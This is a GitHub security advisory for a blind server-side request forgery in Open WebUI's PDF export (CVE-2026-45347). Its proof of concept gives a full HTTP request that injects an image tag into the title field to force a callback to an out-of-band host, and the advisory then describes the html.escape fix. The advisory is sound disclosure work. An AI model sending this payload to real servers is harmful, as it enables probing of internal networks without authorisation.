# [M] Open WebUI vulnerable to blind server side request forgery (SSRF) via the PDF generate function

## Summary
Severity: Medium
Advisory: GHSA-f776-fp4w-266c
CVE: CVE-2026-45347
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-f776-fp4w-266c
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.5.11

## Details
### Summary
Blind server side request forgery (SSRF) via the PDF generate function. 
The finding resulted from a penetration test for a customer. It is suspected that the root cause of the issue lies within the core of Open WebUI, which is why it is being reported as a security issue here. Tested on Open WebUI 0.5.4.

### Details
In the PDF export, user inputs are interpreted as HTML and embedded into the PDF. According to tests, scripts and some potentially dangerous tags (iFrame, Object, etc.) are blocked, preventing server-side content from being read through this vulnerability. However, an image tag can be used to force a server-side request (SSRF), as shown in the following below.

### PoC
Start a chat and export the PDF:
![grafik](https://github.com/user-attachments/assets/fbfc898d-b5fd-473f-8f6e-bdc9c7f130b7)

Intercept the request and insert an `<img>` tag into the `title`:
```http
POST /api/v1/utils/pdf HTTP/2
Host: domain.local
//Some headers removed
Content-Type: application/json
Content-Length: 541
Te: trailers

{"title":"<img src='https://d5jok0s7ghl1p77v5brlqlxwmnsega4z.oastify.com' />","messages":[{"id":"81f24589-384d-431c-a26c-5cd3382ac941","parentId":null,"childrenIds":["0c1a3ee1-6350-4bb4-b95e-fc2341c47e8e"],"role":"user","content":"hallo","timestamp":1736932102,"models":["gpt-4o-POC"]},{"parentId":"81f24589-384d-431c-a26c-5cd3382ac941","id":"0c1a3ee1-6350-4bb4-b95e-fc2341c47e8e","childrenIds":[],"role":"assistant","content":"Hallo! Wie kann ich Ihnen helfen?","model":"gpt-4o-POC","modelName":"gpt-4o-POC","modelIdx":0,"userContext":null,"timestamp":1736932103,"done":true}]}
```

A HTTPS callback was received at https://d5jok0s7ghl1p77v5brlqlxwmnsega4z.oastify.com.

### Impact
A user can force server-side GET requests. During the available testing time, no method was found to read the responses (Blind SSRF). Nonetheless, this should be prevented, as an attacker could enumerate internal assets through response delays and trigger arbitrary GET requests.

## Resolution

Fixed in commit [167c8bf00](https://github.com/open-webui/open-webui/commit/167c8bf00d165af523acfc3b870749f6be6d3e57), first released in **v0.5.11** (2025-02). The fix wraps every user-controllable field that flows into the PDF HTML template (`title`, `content`, `role`, `model`, formatted date) in `html.escape()` before the template f-string is fed to `fpdf2.write_html()`. The PoC payload `<img src='...' />` is escaped to `&lt;img src=&#x27;...&#x27; /&gt;` and rendered as literal text by fpdf2, with no HTML parsing and no outbound request. Users on `>= 0.5.11` are not affected.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-f776-fp4w-266c
- https://nvd.nist.gov/vuln/detail/CVE-2026-45347
- https://github.com/open-webui/open-webui/commit/167c8bf00d165af523acfc3b870749f6be6d3e57
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.5.11
